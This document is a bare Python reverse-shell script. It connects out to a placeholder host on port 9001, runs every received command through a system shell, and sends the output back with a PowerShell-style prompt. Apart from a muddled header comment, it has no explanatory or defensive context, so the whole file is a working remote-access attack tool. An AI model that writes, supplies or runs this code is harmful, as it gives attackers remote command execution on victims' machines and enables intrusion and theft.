# windows (Linux/macOS)
import socket
import subprocess
import os
import sys

def main():
    host = 'IP_ADDRESS'
    port = 9001
    
    try:
        # Create TCP socket and connect
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))
        
        while True:
            # Receive data from the server
            data = client.recv(65536)
            if not data:
                break
            
            # Decode the command
            command = data.decode('ascii').strip()
            
            # Execute the command
            try:
                # Execute command and capture output
                result = subprocess.run(
                    command, 
                    shell=True, 
                    capture_output=True, 
                    text=True,
                    timeout=30
                )
                
                # Combine stdout and stderr
                output = result.stdout
                if result.stderr:
                    output += result.stderr
                
                # Add current directory prompt
                current_dir = os.getcwd()
                sendback = output + '\nPS ' + current_dir + '> '
                
            except subprocess.TimeoutExpired:
                sendback = "Error: Command timed out\nPS " + os.getcwd() + '> '
            except Exception as e:
                sendback = f"Error: {str(e)}\nPS " + os.getcwd() + '> '
            
            # Send response back
            client.send(sendback.encode('ascii'))
            
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        try:
            client.close()
        except:
            pass

if __name__ == "__main__":
    main()
